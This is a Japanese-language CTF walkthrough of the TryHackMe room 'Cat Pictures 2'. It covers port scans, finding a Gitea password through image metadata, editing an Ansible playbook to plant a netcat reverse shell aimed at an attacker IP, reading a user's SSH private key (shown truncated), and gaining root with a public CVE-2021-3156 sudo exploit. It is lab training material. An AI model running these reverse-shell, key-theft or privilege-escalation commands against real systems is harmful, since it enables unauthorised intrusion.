# Cat Pictures2 CTF

https://tryhackme.com/room/catpictures2

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.117.121
root@ip-10-10-133-183:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-01 07:51 BST
Nmap scan report for 10.10.117.121
Host is up (0.0046s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
222/tcp  open  rsh-spx
1337/tcp open  waste
3000/tcp open  ppp
8080/tcp open  http-proxy
MAC Address: 02:31:06:05:90:13 (Unknown)

root@ip-10-10-133-183:~# sudo nmap -sV -p22,80,222,1337,3000,8080 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-01 07:52 BST
Nmap scan report for 10.10.117.121
Host is up (0.00043s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.4.6 (Ubuntu)
222/tcp  open  ssh     OpenSSH 9.0 (protocol 2.0)
1337/tcp open  waste?
3000/tcp open  ppp?
8080/tcp open  http    SimpleHTTPServer 0.6 (Python 3.6.9)
```

```
80: Hosted with Lychee
    Lychee 3.1.1 （ログイン画面に記載）
8080: nginx
```

### gobuster

#### 80

```shell
root@ip-10-10-133-183:~# gobuster dir -x=txt,php -u http://$TARGET -w ./dirlist.txt -t 30 -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.117.121
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                ./dirlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/data                 (Status: 301) [Size: 193] [--> http://10.10.117.121/data/]
/dist                 (Status: 301) [Size: 193] [--> http://10.10.117.121/dist/]
/docs                 (Status: 301) [Size: 193] [--> http://10.10.117.121/docs/]
/favicon.ico          (Status: 200) [Size: 33412]
/.htaccess            (Status: 200) [Size: 630]
/LICENSE              (Status: 200) [Size: 1105]
/php                  (Status: 301) [Size: 193] [--> http://10.10.117.121/php/]
/plugins              (Status: 301) [Size: 193] [--> http://10.10.117.121/plugins/]
/robots.txt           (Status: 200) [Size: 136]
/robots.txt           (Status: 200) [Size: 136]
/src                  (Status: 301) [Size: 193] [--> http://10.10.117.121/src/]
/uploads              (Status: 301) [Size: 193] [--> http://10.10.117.121/uploads/]
/view.php             (Status: 200) [Size: 58172]
Progress: 681570 / 681573 (100.00%)
===============================================================
Finished
===============================================================
```

robots.txt

```
User-agent: *
Disallow: /data/
Disallow: /dist/
Disallow: /docs/
Disallow: /php/
Disallow: /plugins/
Disallow: /src/
Disallow: /uploads/
```

Lychee の脆弱性を検索するが、使えそうなものはない。

下記 ２ ポートが不明なので、詳細なポートスキャンを実行する。

```
1337/tcp open  waste?
3000/tcp open  ppp?
```

## ポートスキャン２

```shell
root@ip-10-10-133-183:~# sudo nmap -A -p22,80,222,1337,3000,8080 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-01 08:55 BST
Nmap scan report for 10.10.117.121
Host is up (0.00051s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 33:f0:03:36:26:36:8c:2f:88:95:2c:ac:c3:bc:64:65 (RSA)
|   256 4f:f3:b3:f2:6e:03:91:b2:7c:c0:53:d5:d4:03:88:46 (ECDSA)
|_  256 13:7c:47:8b:6f:f8:f4:6b:42:9a:f2:d5:3d:34:13:52 (ED25519)
80/tcp   open  http    nginx 1.4.6 (Ubuntu)
| http-git:
|   10.10.117.121:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|       https://github.com/electerious/Lychee.git
|_    Project type: PHP application (guessed from .gitignore)
| http-robots.txt: 7 disallowed entries
|_/data/ /dist/ /docs/ /php/ /plugins/ /src/ /uploads/
|_http-server-header: nginx/1.4.6 (Ubuntu)
|_http-title: Lychee
222/tcp  open  ssh     OpenSSH 9.0 (protocol 2.0)
1337/tcp open  waste?
| fingerprint-strings:
|   GenericLines:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions:
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Content-Length: 3858
|     Content-Type: text/html; charset=utf-8
|     Date: Tue, 01 Apr 2025 07:55:59 GMT
|     Last-Modified: Wed, 19 Oct 2022 15:30:49 GMT
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>OliveTin</title>
|     <link rel = "stylesheet" type = "text/css" href = "style.css" />
|     <link rel = "shortcut icon" type = "image/png" href = "OliveTinLogo.png" />
|     <link rel = "apple-touch-icon" sizes="57x57" href="OliveTinLogo-57px.png" />
|     <link rel = "apple-touch-icon" sizes="120x120" href="OliveTinLogo-120px.png" />
|     <link rel = "apple-touch-icon" sizes="180x180" href="OliveTinLogo-180px.png" />
|     </head>
|     <body>
|     <main title = "main content">
|     <fieldset id = "section-switcher" title = "Sections">
|     <button id = "showActions">Actions</button>
|_    <button id = "showLogs">Logs</but
3000/tcp open  ppp?
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Cache-Control: no-store, no-transform
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: i_like_gitea=547176777ad16a61; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=OYkQ9B7rVmQiAHcgJOY2-fxt3Q86MTc0MzQ5NDE1OTgwODE4NTkyMA; Path=/; Expires=Wed, 02 Apr 2025 07:55:59 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 01 Apr 2025 07:55:59 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title> Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Cache-Control: no-store, no-transform
|     Set-Cookie: i_like_gitea=8024c25e22695cac; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=CJ7z_nkiYNvQDVD27Peml_3zYNc6MTc0MzQ5NDE2NDg2NTYzMjU0OA; Path=/; Expires=Wed, 02 Apr 2025 07:56:04 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 01 Apr 2025 07:56:04 GMT
|_    Content-Length: 0
8080/tcp open  http    SimpleHTTPServer 0.6 (Python 3.6.9)
|_http-server-header: SimpleHTTP/0.6 Python/3.6.9
|_http-title: Welcome to nginx!
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port1337-TCP:V=7.80%I=7%D=4/1%Time=67EB9C0F%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(GetRequest,FCC,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x
SF:20bytes\r\nContent-Length:\x203858\r\nContent-Type:\x20text/html;\x20ch
SF:arset=utf-8\r\nDate:\x20Tue,\x2001\x20Apr\x202025\x2007:55:59\x20GMT\r\
SF:nLast-Modified:\x20Wed,\x2019\x20Oct\x202022\x2015:30:49\x20GMT\r\n\r\n
SF:<!DOCTYPE\x20html>\n\n<html>\n\t<head>\n\n\t\t<meta\x20name=\"viewport\
SF:"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n\n\t\t<tit
SF:le>OliveTin</title>\n\t\t<link\x20rel\x20=\x20\"stylesheet\"\x20type\x2
SF:0=\x20\"text/css\"\x20href\x20=\x20\"style\.css\"\x20/>\n\t\t<link\x20r
SF:el\x20=\x20\"shortcut\x20icon\"\x20type\x20=\x20\"image/png\"\x20href\x
SF:20=\x20\"OliveTinLogo\.png\"\x20/>\n\n\t\t<link\x20rel\x20=\x20\"apple-
SF:touch-icon\"\x20sizes=\"57x57\"\x20href=\"OliveTinLogo-57px\.png\"\x20/
SF:>\n\t\t<link\x20rel\x20=\x20\"apple-touch-icon\"\x20sizes=\"120x120\"\x
SF:20href=\"OliveTinLogo-120px\.png\"\x20/>\n\t\t<link\x20rel\x20=\x20\"ap
SF:ple-touch-icon\"\x20sizes=\"180x180\"\x20href=\"OliveTinLogo-180px\.png
SF:\"\x20/>\n\t</head>\n\n\t<body>\n\t\t<main\x20title\x20=\x20\"main\x20c
SF:ontent\">\n\t\t\t<fieldset\x20id\x20=\x20\"section-switcher\"\x20title\
SF:x20=\x20\"Sections\">\n\t\t\t\t<button\x20id\x20=\x20\"showActions\">Ac
SF:tions</button>\n\t\t\t\t<button\x20id\x20=\x20\"showLogs\">Logs</but")%
SF:r(HTTPOptions,FCC,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\
SF:nContent-Length:\x203858\r\nContent-Type:\x20text/html;\x20charset=utf-
SF:8\r\nDate:\x20Tue,\x2001\x20Apr\x202025\x2007:55:59\x20GMT\r\nLast-Modi
SF:fied:\x20Wed,\x2019\x20Oct\x202022\x2015:30:49\x20GMT\r\n\r\n<!DOCTYPE\
SF:x20html>\n\n<html>\n\t<head>\n\n\t\t<meta\x20name=\"viewport\"\x20conte
SF:nt=\"width=device-width,\x20initial-scale=1\.0\">\n\n\t\t<title>OliveTi
SF:n</title>\n\t\t<link\x20rel\x20=\x20\"stylesheet\"\x20type\x20=\x20\"te
SF:xt/css\"\x20href\x20=\x20\"style\.css\"\x20/>\n\t\t<link\x20rel\x20=\x2
SF:0\"shortcut\x20icon\"\x20type\x20=\x20\"image/png\"\x20href\x20=\x20\"O
SF:liveTinLogo\.png\"\x20/>\n\n\t\t<link\x20rel\x20=\x20\"apple-touch-icon
SF:\"\x20sizes=\"57x57\"\x20href=\"OliveTinLogo-57px\.png\"\x20/>\n\t\t<li
SF:nk\x20rel\x20=\x20\"apple-touch-icon\"\x20sizes=\"120x120\"\x20href=\"O
SF:liveTinLogo-120px\.png\"\x20/>\n\t\t<link\x20rel\x20=\x20\"apple-touch-
SF:icon\"\x20sizes=\"180x180\"\x20href=\"OliveTinLogo-180px\.png\"\x20/>\n
SF:\t</head>\n\n\t<body>\n\t\t<main\x20title\x20=\x20\"main\x20content\">\
SF:n\t\t\t<fieldset\x20id\x20=\x20\"section-switcher\"\x20title\x20=\x20\"
SF:Sections\">\n\t\t\t\t<button\x20id\x20=\x20\"showActions\">Actions</but
SF:ton>\n\t\t\t\t<button\x20id\x20=\x20\"showLogs\">Logs</but");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.80%I=7%D=4/1%Time=67EB9C0F%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(GetRequest,31F0,"HTTP/1\.0\x20200\x20OK\r\nCache-Control:\
SF:x20no-store,\x20no-transform\r\nContent-Type:\x20text/html;\x20charset=
SF:UTF-8\r\nSet-Cookie:\x20i_like_gitea=547176777ad16a61;\x20Path=/;\x20Ht
SF:tpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csrf=OYkQ9B7rVmQiAHcgJOY2-fx
SF:t3Q86MTc0MzQ5NDE1OTgwODE4NTkyMA;\x20Path=/;\x20Expires=Wed,\x2002\x20Ap
SF:r\x202025\x2007:55:59\x20GMT;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cooki
SF:e:\x20macaron_flash=;\x20Path=/;\x20Max-Age=0;\x20HttpOnly;\x20SameSite
SF:=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Tue,\x2001\x20Apr\x2
SF:02025\x2007:55:59\x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-
SF:US\"\x20class=\"theme-\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<me
SF:ta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sca
SF:le=1\">\n\t<title>\x20Gitea:\x20Git\x20with\x20a\x20cup\x20of\x20tea</t
SF:itle>\n\t<link\x20rel=\"manifest\"\x20href=\"data:application/json;base
SF:64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUi
SF:OiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2x
SF:vY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi")%r(Help,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOpt
SF:ions,1C2,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nCache-Control
SF::\x20no-store,\x20no-transform\r\nSet-Cookie:\x20i_like_gitea=8024c25e2
SF:2695cac;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csr
SF:f=CJ7z_nkiYNvQDVD27Peml_3zYNc6MTc0MzQ5NDE2NDg2NTYzMjU0OA;\x20Path=/;\x2
SF:0Expires=Wed,\x2002\x20Apr\x202025\x2007:56:04\x20GMT;\x20HttpOnly;\x20
SF:SameSite=Lax\r\nSet-Cookie:\x20macaron_flash=;\x20Path=/;\x20Max-Age=0;
SF:\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate
SF::\x20Tue,\x2001\x20Apr\x202025\x2007:56:04\x20GMT\r\nContent-Length:\x2
SF:00\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
SF:\r\n400\x20Bad\x20Request");
MAC Address: 02:31:06:05:90:13 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 3.8 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.51 ms 10.10.117.121

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.20 seconds
```

#### 1337 ポート OliveTin

```
<title>OliveTin</title>
Version: 2022-10-19
```

https://github.com/OliveTin/OliveTin

- 事前定義のシェルコマンドを実行できるプラットフォーム、とのこと。
- Ansible Playbook を実行したときのログ。
- bismuth ユーザーだということは分かった。

```
ok: [127.0.0.1] => {
    "username_on_the_host": {
        "changed": false,
        "cmd": [
            "whoami"
        ],
        "delta": "0:00:00.004239",
        "end": "2025-04-01 01:12:59.974987",
        "failed": false,
        "rc": 0,
        "start": "2025-04-01 01:12:59.970748",
        "stderr": "",
        "stderr_lines": [],
        "stdout": "bismuth",
        "stdout_lines": [
            "bismuth"
        ]
    }
}
```

#### 3000 ポート Gitea

```
<title> Gitea: Git with a cup of tea</title>
Gitea Version: 1.17.3
```

https://about.gitea.com/

- DevOps プラットフォーム。
- ユーザー登録は可能で、新しいリポジトリも作成可能。
- 初期状態として、下記のユーザーが登録済だった。

```
samarium@catpicturesii.net
```

catpicturesii.net を hosts に追加したが、特に変化なし。

たぶん、Gitea 上で Ansible Playbook を変更してリバースシェルなどを実行するのだろうと推測したが、手がかりが見つからなかった。

まったく分からないのでここでウォークスルーを見た。

## 猫

猫の 1 枚目の画像にヒントが表示されている。

```
Description  note to self: strip metadata
```

exiftool でメタデータ確認すると、下記のデータがあった

```
XMP Toolkit                     : Image::ExifTool 12.49
Title                           : :8080/764efa883dda1e11db47671c4a3bbd9e.txt
Image Width                     : 720
```

txt を取得。

```
note to self:

I setup an internal gitea instance to start using IaC for this server. It's at a quite basic state, but I'm putting the password here because I will definitely forget.
This file isn't easy to find anyway unless you have the correct url...

gitea: port 3000
user: samarium
password: ひみつ

ansible runner (olivetin): port 1337
```

samarium でログインして ansible リポジトリを参照すると、flag1 を発見。

## Ansible リポジトリ

Gitea 上で直接編集できるのでリバースシェルに変更。

```yaml
- name: Test
  hosts: all # Define all the hosts
  remote_user: bismuth
  # Defining the Ansible task
  tasks:
    - name: get the username running the deploy
      become: false
      command: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.2.22.182 6666 >/tmp/f
      register: username_on_the_host
      changed_when: false

    - debug: var=username_on_the_host

    - name: Test
      shell: echo hi
```

1337 ポートで実行したらエラー発生。

```json
{"changed": false, "cmd": ["rm", "/tmp/f;mkfifo", "/tmp/f;cat", "/tmp/f|sh", "-i", "2>&1|nc", "10.2.22.182", "6666", ">/tmp/f"], "delta"
```

いろいろ試したが、うまくいかないので SSH 秘密鍵を狙う。

```json
- name: Test
  hosts: all                                  # Define all the hosts
  remote_user: bismuth
  # Defining the Ansible task
  tasks:
    - name: get the username running the deploy
      become: false
      command: cat /home/bismuth/.ssh/id_rsa
      register: username_on_the_host
      changed_when: false
```

取れた！

```json
ok: [127.0.0.1] => {
    "username_on_the_host": {
        "changed": false,
        "cmd": [
            "cat",
            "/home/bismuth/.ssh/id_rsa"
        ],
        "delta": "0:00:00.003141",
        "end": "2025-04-01 02:08:12.459021",
        "failed": false,
        "rc": 0,
        "start": "2025-04-01 02:08:12.455880",
        "stderr": "",
        "stderr_lines": [],
        "stdout": "-----BEGIN RSA PRIVATE KEY-----\nMIIEpQIBAAKCAQEA2epfgbqSrWGvHLh3a3K2X/6flpaL2ccuKMjnkBfxJhPK721K\nuuqJIyB0iMoWmBFo
        中略
        +MRoXrLoK35CDg6MtBL8rxDwx7aC\nPXrqJoUuYPPMjeeqcv0LbXDT3a/mkj074aB5LWcEYxNkIyJGC5EbRkU=\n-----END RSA PRIVATE KEY-----",
        "stdout_lines": [
            "-----BEGIN RSA PRIVATE KEY-----",
            "MIIEpQIBAAKCAQEA2epfgbqSrWGvHLh3a3K2X/6flpaL2ccuKMjnkBfxJhPK721K",
            中略
            "uuqJIyB0iMoWmBFomkj074aB5LWcEYxNkIyJGC5EbRkU=",
            "-----END RSA PRIVATE KEY-----"
        ]
```

秘密鍵を保存し、SSH 接続できた。

```shell
$ ssh bismuth@10.10.117.121 -i ./id_rsa_cat
```

```shell
bismuth@catpictures-ii:~$ ls -al
total 56
drwxr-xr-x 8 bismuth bismuth 4096 Mar 20  2023 .
drwxr-xr-x 3 root    root    4096 Nov  7  2022 ..
drwxr-xr-x 3 bismuth bismuth 4096 Nov  7  2022 .ansible
lrwxrwxrwx 1 bismuth bismuth    9 Nov  7  2022 .bash_history -> /dev/null
-rw-r--r-- 1 bismuth bismuth  220 Nov  7  2022 .bash_logout
-rw-r--r-- 1 bismuth bismuth 3771 Nov  7  2022 .bashrc
drwx------ 2 bismuth bismuth 4096 Nov  7  2022 .cache
drwxr-x--- 3 bismuth bismuth 4096 Nov  7  2022 .config
-rw-rw-r-- 1 bismuth bismuth   33 Mar 20  2023 flag2.txt
drwx------ 3 bismuth bismuth 4096 Nov  7  2022 .gnupg
-rw------- 1 bismuth bismuth   43 Nov  7  2022 .lesshst
drwxrwxr-x 2 bismuth bismuth 4096 Nov  7  2022 .nano
-rw-r--r-- 1 bismuth bismuth  655 Nov  7  2022 .profile
drwx------ 2 bismuth bismuth 4096 Nov  7  2022 .ssh
-rw-r--r-- 1 bismuth bismuth    0 Nov  7  2022 .sudo_as_admin_successful
-rw-rw-r-- 1 bismuth bismuth  182 Nov  7  2022 .wget-hsts
bismuth@catpictures-ii:~$ cat flag2.txt
5e.......................
```

フラグ２ゲット。

## 権限昇格

ひと通り調べたが手がかりがない。linpeas.sh を実行したら sudo のバージョンが低い点だけ気になる。

```shell
bismuth@catpictures-ii:~$ sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```

`sudo -u#-1 /bin/bash` のパターンは、パスワードが分からないので使えなかった。

### CVE-2021-3156

kali

```shell
git clone https://github.com/CptGibbon/CVE-2021-3156.git
tar -czf cve.tar.gz ./CVE-2021-3156
```

target

```shell
tar -xzf cve.tar.gz

bismuth@catpictures-ii:~/CVE-2021-3156$ make
mkdir libnss_x
cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
cc -O3 -o exploit exploit.c

bismuth@catpictures-ii:~/CVE-2021-3156$ ./exploit
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare),1000(bismuth)
```

root シェル取得成功。

```shell
# cat /root/flag3.txt
6d2..............................
```

フラグ３ゲット

## 振り返り

- Easy ではない。非常に盛りだくさんな内容。OliveTin, Gitea は初見。
- 猫の画像にヒントが隠されている点が一番苦労した。
- sudo の CVE-2021-3156 脆弱性は初見。sudo のバージョンと対応する脆弱性をまとめて、権限昇格.md のアップデートが必要。
